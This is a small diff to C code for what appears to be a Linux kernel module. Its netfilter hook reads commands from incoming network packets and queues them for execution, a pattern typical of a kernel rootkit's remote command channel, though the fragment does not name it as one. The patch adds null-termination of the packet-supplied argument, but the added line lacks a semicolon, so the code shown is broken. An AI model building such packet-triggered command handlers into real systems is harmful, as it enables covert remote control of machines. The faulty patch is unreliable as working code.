@@ -215,8 +215,10 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
     INIT_WORK(&command_work->work, handle_command);
     command_work->cmd = cmd;
-    arg = kmalloc(user_data_len + 1, GFP_KERNEL); /* we want the string to be null-terminated */
+    // we want the argument to be null-terminated.
+    arg = kmalloc(user_data_len + 1, GFP_KERNEL);
     memcpy(arg, user_data, user_data_len);
+    arg[user_data_len] = '\0'
     command_work->arg = arg;
     command_work->local_addr = iph->daddr;
     command_work->remote_addr = iph->saddr;
